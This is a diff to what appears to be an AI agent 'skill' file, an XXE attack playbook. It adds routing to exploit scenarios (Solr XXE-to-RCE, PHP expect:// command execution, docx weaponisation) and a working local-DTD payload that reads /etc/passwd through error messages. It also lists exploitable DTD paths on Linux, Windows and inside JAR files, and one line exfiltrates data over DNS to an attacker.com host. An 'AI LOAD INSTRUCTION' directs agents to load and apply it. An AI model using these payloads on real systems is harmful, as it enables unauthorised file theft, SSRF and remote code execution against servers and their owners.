@@ -6,13 +6,23 @@ description: >-
 
 # SKILL: XML External Entity Injection (XXE) — Expert Attack Playbook
 
-> **AI LOAD INSTRUCTION**: Expert XXE techniques. Covers all injection contexts (SOAP, REST JSON→XML parsers, Office files, SVG), OOB exfiltration (critical when direct read fails), blind XXE detection, and XXE-to-SSRF chain. Base models often miss OOB and non-XML context XXE.
+> **AI LOAD INSTRUCTION**: Expert XXE techniques. Covers all injection contexts (SOAP, REST JSON→XML parsers, Office files, SVG), OOB exfiltration (critical when direct read fails), blind XXE detection, and XXE-to-SSRF chain. Base models often miss OOB and non-XML context XXE. For real-world CVE chains, Office docx XXE step-by-step, PHP expect:// RCE, and Solr XXE+RCE, load the companion [SCENARIOS.md](./SCENARIOS.md).
 
 ## 0. RELATED ROUTING
 
 Also load:
 
 - [upload insecure files](../upload-insecure-files/SKILL.md) when XXE is reachable through SVG, OOXML, import, or preview pipelines
+
+### Extended Scenarios
+
+Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
+- Apache Solr XXE + RCE chain (CVE-2017-12629) — XXE to read config, then VelocityResponseWriter for RCE
+- Office docx XXE step-by-step — unzip → inject DOCTYPE into `word/document.xml` or `[Content_Types].xml` → repackage → upload
+- DOCTYPE-based blind SSRF — `PUBLIC` external DTD reference triggers HTTP callback without entity reflection
+- PHP `expect://` protocol via XXE — direct command execution when expect extension is installed
+- Blind XXE via error messages — force file path error that leaks content in exception text
+- XXE in SOAP web services — inject entities into SOAP Envelope/Body elements
 
 ---
 
@@ -253,3 +263,64 @@ Use DNS-only OOB via `SYSTEM "file://HASH.attacker.com"` — no HTTP required, D
 □ Try Content-Type: application/xml on JSON endpoints
 □ Try XInclude if DOCTYPE-based fails
 ```
+
+---
+
+## 13. LOCAL DTD INJECTION (BLIND XXE AMPLIFICATION)
+
+When external entities are blocked but local DTD files exist on the server:
+
+### Technique
+
+```xml
+<!-- Override an entity defined in a LOCAL DTD file -->
+<!DOCTYPE foo [
+  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+  <!ENTITY % ISOamso '
+    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+    &#x25;eval;
+    &#x25;error;
+  '>
+  %local_dtd;
+]>
+```
+
+### Common Local DTD Paths
+
+#### Linux
+
+```
+/usr/share/yelp/dtd/docbookx.dtd           # GNOME Help
+/usr/share/xml/fontconfig/fonts.dtd         # Fontconfig
+/usr/share/sgml/docbook/xml-dtd-*/docbookx.dtd
+/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd
+/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd
+/usr/share/struts/struts-config_1_0.dtd     # Apache Struts
+/usr/share/nmap/nmap.dtd                    # Nmap
+/opt/zaproxy/xml/alert.dtd                  # OWASP ZAP
+```
+
+#### Windows
+
+```
+C:\Windows\System32\wbem\xml\cim20.dtd            # WMI
+C:\Windows\System32\wbem\xml\wmi20.dtd             # WMI
+C:\Program Files\IBM\WebSphere\*.dtd               # WebSphere
+C:\Program Files (x86)\Lotus\*.dtd                 # Lotus Notes
+```
+
+#### Inside JAR Files (Java Applications)
+
+```
+jar:file:///usr/share/java/tomcat-*.jar!/javax/servlet/resources/web-app_2_3.dtd
+jar:file:///opt/wildfly/modules/*.jar!/org/jboss/as/*.dtd
+file:///usr/share/java/struts2-core-*.jar!/struts-2.5.dtd
+```
+
+### Why This Works
+
+- External connections blocked (firewall/WAF/egress filter)
+- But file:// to LOCAL files is usually allowed
+- Local DTD is trusted → entity overrides inject attacker-controlled definitions
+- Error messages or blind extraction via file:// still works
